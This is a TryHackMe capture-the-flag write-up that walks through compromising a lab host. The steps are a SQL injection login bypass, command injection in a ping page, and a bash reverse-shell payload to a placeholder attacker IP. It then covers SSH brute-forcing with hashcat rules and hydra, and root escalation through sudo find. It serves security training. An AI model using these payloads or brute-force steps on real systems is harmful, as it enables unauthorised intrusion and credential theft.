# THM Write-up: Operation Promotion

**Platform:** TryHackMe  
**Room:** [Operation Promotion](https://tryhackme.com/room/operationpromotion)  
**Difficulty:** Easy  
**Category:** Web Exploitation, Linux Privilege Escalation  
**Author:** GenericLamp

---

## Scenario

> You are up for promotion at Hadron Security. Your senior lead, Mara, has handed you a solo engagement against RecruitCorp, a small recruiting firm with a public-facing portal. Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester title.

---

## Recon

```bash
nmap -sC -sV -p- 10.x.x.x
```

Open ports:

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80 | HTTP | Apache 2.4.58 |
| 139/445 | SMB | Samba |

`robots.txt` disallows `/admin/`.

---

## Enumeration

### SMB

```bash
smbclient -L //10.x.x.x -N
```

Anonymous access to the `public` share is possible. It only contains a `README.txt` with no useful content.

### Web — Directory Bruteforce

```bash
gobuster dir -u http://10.x.x.x -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt
```

Findings:
- `/admin/` → Login portal
- `/config/` → 403 (directory exists, no listing)

---

## Exploitation

### 1. SQL Injection — Auth Bypass

The login form at `/admin/` is vulnerable to SQL injection. The PHP source (retrieved later, i just tried it) confirms direct string concatenation without escaping:

```php
$query = "SELECT id, username FROM users WHERE username='$u' AND password='$p'";
```

Payload in the username field (aslo posted in password field, as both fields needed to be used):

```
admin'--
```

This comments out the password check. Login as `admin` succeeds.

### 2. Admin Portal — User Lookup

After logging in, a user lookup function is available at `/admin/users/lookup.php?id=<n>`. Iterating over IDs reveals user 7:

```
Username: sysmaint
Role:     system
Notes:    Service account for /admin/sysmaint-checks/ping.php. Do not disable.
```

**Failed attempt — sqlmap on the lookup endpoint:**  
I tried running sqlmap against the `?id=` parameter. sqlmap found no injection because the parameter is cast to an integer via `intval()` — string-based payloads don't apply here. The lookup page is not an attack vector.

### 3. Command Injection — ping.php

The Service might be the next target.

```
GET /admin/sysmaint-checks/ping.php?host=127.0.0.1;id
```

The response includes `uid=33(www-data)` — command injection confirmed.

### 4. Reverse Shell

Listener on Kali:

```bash
nc -lvnp 4444
```

Payload:

```
host=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/<KALI_IP>/4444+0>%261'
```

Stabilise the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Kali: Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

---

## Post-Exploitation

### www-data — Enumeration

With a shell as `www-data`, we read `/var/www/html/config/db.conf`:

```
db_user=jford
db_pass_hash=$2b$10$[REDACTED]  (bcrypt)
```

This reveals the Linux username `jford`. We also dump the SQLite database at `/var/lib/recruitcorp/app.db` and retrieve plaintext passwords for all web application users — but none work for SSH.

### www-data → jford

**Failed attempts:**
- `sudo -l` — www-data has no sudo privileges
- `/home/jford/` — no read access as www-data
- SUID binaries — only standard system binaries, nothing exploitable
- Cron jobs — only system crons, nothing relevant
- DB passwords tested against SSH — no match
- Pattern-based wordlist (`pw_jf_0000`–`pw_jf_9999`) — no match
- hashcat with rockyou against the bcrypt hash — estimated runtime 2 days, aborted

**Successful approach — context-based wordlist:**

The website's front page advertises a "Spring Hiring Campaign 2026". Derived base password: `spring2026`.
(multible attempts to create wordlist with different wordings)

```bash
echo "spring2026" > base.txt
hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule > wordlist.txt
hydra -l jford -P wordlist.txt 10.x.x.x ssh -t 4
```

Result: password `[REDACTED]` — the `dive.rule` appends special characters among other mutations.

```bash
ssh jford@10.x.x.x
cat ~/user.txt  # → THM{***}
```

### jford → root

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
```

`find` can be run as root without a password. GTFOBins exploit:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
# root shell
cat /root/flag.txt  # → THM{***}
```

> **Note:** It's also possible to read the flag directly without spawning a shell:
> ```bash
> sudo /usr/bin/find /root/flag.txt -exec cat {} \;
> ```
> For a full compromise (and exam scenarios), spawning a root shell is the correct approach.

---

## Summary

| Phase | Technique |
|-------|-----------|
| Initial Access | SQLi auth bypass (`admin'--`) |
| Code Execution | Command injection in `ping.php` |
| Shell | Bash reverse shell via `nc` |
| Lateral Movement | SSH brute-force with context-based wordlist (hashcat dive.rule) |
| Privilege Escalation | sudo `find` → GTFOBins shell |

**Key Takeaway:** rockyou fails against bcrypt without a GPU (kaliVM). And (PW redacted) would not have been in rockyou anyway. The solution was OSINT on the target site itself — the company's campaign name as a password base, combined with hashcat's dive rule for mutations. Context-based wordlists beat generic ones when dealing with slow hash algorithms.
